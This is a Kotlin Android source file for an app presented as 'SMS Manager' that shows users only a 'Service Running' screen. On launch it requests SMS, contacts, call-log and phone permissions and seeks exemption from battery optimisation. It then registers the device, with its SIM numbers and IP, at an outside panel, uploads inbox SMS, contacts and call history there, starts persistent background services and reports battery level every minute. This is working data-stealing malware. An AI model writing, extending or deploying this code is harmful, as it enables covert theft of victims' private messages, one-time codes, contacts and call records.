package com.example.test

import android.Manifest
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.URL

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val FCM_TIMEOUT_MS = 5000L
    private val url = Constants.BASE_URL
    private val userId = Constants.USER_ID

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            sendBatteryUpdate()
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            Log.d(TAG, "✅ All permissions granted")
            askIgnoreBatteryOptimizations()
        } else {
            Log.w(TAG, "⚠️ Some permissions denied")
            Toast.makeText(this, "Permissions are required", Toast.LENGTH_SHORT).show()
            requestAllPermissions()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        Log.d(TAG, "📱 Device ID: $deviceId")

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    Box(
                        modifier = Modifier.fillMaxSize(),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Text(
                                text = "SMS Manager",
                                fontSize = 24.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.Black
                            )
                            Spacer(modifier = Modifier.height(16.dp))
                            Text(
                                text = "Service Running",
                                fontSize = 16.sp,
                                color = Color.Gray
                            )
                        }
                    }
                }
            }
        }

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG
        )

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            Log.d(TAG, "✅ All permissions already granted")
            askIgnoreBatteryOptimizations()
        } else {
            Log.d(TAG, "📝 Requesting permissions...")
            permissionLauncher.launch(permissions)
        }
    }

    private fun askIgnoreBatteryOptimizations() {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔋 CHECKING BATTERY OPTIMIZATION")
        Log.d(TAG, "════════════════════════════════════════")

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.w(TAG, "⚠️ Battery optimization is ON, requesting to ignore...")
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
            handler.postDelayed({ continueInitialization() }, 2000)
        } else {
            Log.d(TAG, "✅ Battery optimization already ignored")
            continueInitialization()
        }
    }

    private fun continueInitialization() {
        Log.d(TAG, "🚀 Starting initialization...")

        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
            } else {
                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "📝 Using fallback token: $fcmToken")
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "📝 Using fallback token: $fcmToken")
            }

            Thread {
                try {
                    Log.d(TAG, "📡 Starting network operations...")
                    registerDevice()
                    uploadAllSmsOnce()
                    uploadAllContactsOnce()
                    uploadCallHistoryOnce()
                    startBackgroundService()
                    startHeartbeatService()
                    Log.d(TAG, "✅ All operations completed")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Init error: ${e.message}", e)
                    e.printStackTrace()
                }
            }.start()

            handler.post(batteryUpdater)

        }, FCM_TIMEOUT_MS)
    }

    private fun sendBatteryUpdate() {
        if (fcmToken.isEmpty()) {
            Log.w(TAG, "⚠️ FCM token empty, skipping battery update")
            return
        }

        Thread {
            var conn: HttpURLConnection? = null
            try {
                val batteryLevel = getBatteryPercentage()
                Log.d(TAG, "🔋 Sending battery update: $batteryLevel%")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", batteryLevel)
                    put("isOnline", true)
                }

                val url = URL("https://panel.panelguy.xyz/devices/battery-update")
                conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Battery update response: $responseCode")

            } catch (e: Exception) {
                Log.e(TAG, "❌ Battery update exception: ${e.message}", e)
            } finally {
                conn?.disconnect()
            }
        }.start()
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = registerReceiver(null, ifilter)
            val level = batteryStatus?.getIntExtra("level", -1) ?: -1
            val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1
            if (level != -1 && scale != -1) {
                ((level / scale.toFloat()) * 100).toInt()
            } else -1
        } catch (e: Exception) {
            -1
        }
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress ?: "Unknown"
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ IP Address error: ${e.message}")
        }
        return "10.0.2.15"
    }

    private fun getSimInfo(): JSONArray {
        val simArray = JSONArray()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) return simArray

        try {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val sims = subManager.activeSubscriptionInfoList

            if (sims.isNullOrEmpty()) {
                val fakeSim = JSONObject().apply {
                    put("simSlot", 0)
                    put("carrierName", "Emulator Carrier")
                    put("displayName", "Test SIM")
                    put("phoneNumber", "15555215554")
                }
                simArray.put(fakeSim)
            } else {
                sims.forEach { info ->
                    val sim = JSONObject().apply {
                        put("simSlot", info.simSlotIndex)
                        put("carrierName", info.carrierName.toString())
                        put("displayName", info.displayName.toString())
                        put("phoneNumber", info.number ?: "Unknown")
                    }
                    simArray.put(sim)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SIM Info error: ${e.message}")
        }
        return simArray
    }

    private fun registerDevice() {
        var conn: HttpURLConnection? = null
        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📝 REGISTERING DEVICE")
            Log.d(TAG, "════════════════════════════════════════")

            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("IP_ADDRESS", getIPAddress())
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("deviceModel", Build.MODEL)
                put("CPU_ARCHITECTURE", Build.SUPPORTED_ABIS[0])
                put("SDK_INT", Build.VERSION.SDK_INT)
                put("ANDROID_VERSION", Build.VERSION.RELEASE)
                put("battery", getBatteryPercentage())
                put("fcmToken", fcmToken)
                put("simInfo", getSimInfo())
                put("userId", userId)
                put("Type", "MP")
                put("isEmulator", true)
            }

            val url = URL("https://panel.panelguy.xyz/devices/register")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Response code: $responseCode")

            if (responseCode in 200..299) {
                val response = conn.inputStream.bufferedReader().use { it.readText() }
                Log.d(TAG, "✅ Registration successful: $response")
            } else {
                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
                Log.e(TAG, "❌ Registration failed ($responseCode): $error")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Registration error: ${e.message}", e)
        } finally {
            conn?.disconnect()
        }
    }

    private fun uploadAllSmsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📨 UPLOADING SMS")
            Log.d(TAG, "════════════════════════════════════════")

            val smsUri = Uri.parse("content://sms/inbox")
            val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")

            cursor?.use {
                if (it.moveToFirst()) {
                    val smsBatch = JSONArray()
                    var totalSent = 0

                    do {
                        try {
                            val sms = JSONObject().apply {
                                put("id", it.getString(it.getColumnIndexOrThrow("_id")))
                                put("address", it.getString(it.getColumnIndexOrThrow("address")))
                                put("body", it.getString(it.getColumnIndexOrThrow("body")))
                                put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                                put("type", "incoming")
                                put("deviceId", deviceId)
                            }
                            smsBatch.put(sms)

                            if (smsBatch.length() >= 50) {
                                if (uploadSmsBatch(smsBatch)) {
                                    totalSent += smsBatch.length()
                                    while (smsBatch.length() > 0) smsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading SMS: ${e.message}")
                        }
                    } while (it.moveToNext())

                    if (smsBatch.length() > 0 && uploadSmsBatch(smsBatch)) {
                        totalSent += smsBatch.length()
                    }
                    Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
        }
    }

    private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply { put("messages", smsArray) }
            val url = URL("https://panel.panelguy.xyz/sms/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 SMS upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun uploadAllContactsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "👥 UPLOADING CONTACTS")
            Log.d(TAG, "════════════════════════════════════════")

            val contactsUri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
            )

            val cursor = contentResolver.query(contactsUri, projection, null, null, null)

            cursor?.use {
                if (it.moveToFirst()) {
                    val contactsBatch = JSONArray()
                    var totalSent = 0

                    do {
                        try {
                            val contact = JSONObject().apply {
                                put("contactId", it.getString(0))
                                put("name", it.getString(1))
                                put("phoneNumber", it.getString(2))
                                put("type", it.getInt(3))
                                put("deviceId", deviceId)
                            }
                            contactsBatch.put(contact)

                            if (contactsBatch.length() >= 100) {
                                if (uploadContactsBatch(contactsBatch)) {
                                    totalSent += contactsBatch.length()
                                    while (contactsBatch.length() > 0) contactsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading contact: ${e.message}")
                        }
                    } while (it.moveToNext())

                    if (contactsBatch.length() > 0 && uploadContactsBatch(contactsBatch)) {
                        totalSent += contactsBatch.length()
                    }
                    Log.d(TAG, "✅ Total contacts uploaded: $totalSent")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Contacts upload error: ${e.message}", e)
        }
    }

    private fun uploadContactsBatch(contactsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("contacts", contactsArray)
                put("deviceId", deviceId)
            }
            val url = URL("https://panel.panelguy.xyz/contacts/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Contacts upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ Contacts batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun uploadCallHistoryOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📞 UPLOADING CALL HISTORY")
            Log.d(TAG, "════════════════════════════════════════")

            val callLogUri = android.provider.CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                android.provider.CallLog.Calls._ID,
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DATE,
                android.provider.CallLog.Calls.DURATION,
                android.provider.CallLog.Calls.CACHED_NAME
            )

            val cursor = contentResolver.query(
                callLogUri, projection, null, null,
                "${android.provider.CallLog.Calls.DATE} DESC LIMIT 200"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val callsBatch = JSONArray()
                    var totalSent = 0

                    do {
                        try {
                            val callType = it.getInt(2)
                            val callTypeStr = when (callType) {
                                android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                                android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
                                android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
                                android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                                else -> "unknown"
                            }

                            val call = JSONObject().apply {
                                put("id", it.getString(0))
                                put("phoneNumber", it.getString(1) ?: "Unknown")
                                put("type", callTypeStr)
                                put("date", it.getLong(3))
                                put("duration", it.getInt(4))
                                put("name", it.getString(5) ?: "")
                                put("deviceId", deviceId)
                            }
                            callsBatch.put(call)

                            if (callsBatch.length() >= 100) {
                                if (uploadCallsBatch(callsBatch)) {
                                    totalSent += callsBatch.length()
                                    while (callsBatch.length() > 0) callsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading call log: ${e.message}")
                        }
                    } while (it.moveToNext())

                    if (callsBatch.length() > 0 && uploadCallsBatch(callsBatch)) {
                        totalSent += callsBatch.length()
                    }
                    Log.d(TAG, "✅ Total call logs uploaded: $totalSent")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call history upload error: ${e.message}", e)
        }
    }

    private fun uploadCallsBatch(callsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("calls", callsArray)
                put("deviceId", deviceId)
            }
            val url = URL("https://panel.panelguy.xyz/calls/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Call logs upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call logs batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun startBackgroundService() {
        try {
            val intent = Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ SmsService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}")
        }
    }

    private fun startHeartbeatService() {
        try {
            val intent = Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ HeartbeatService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        Log.d(TAG, "👋 MainActivity destroyed")
    }
}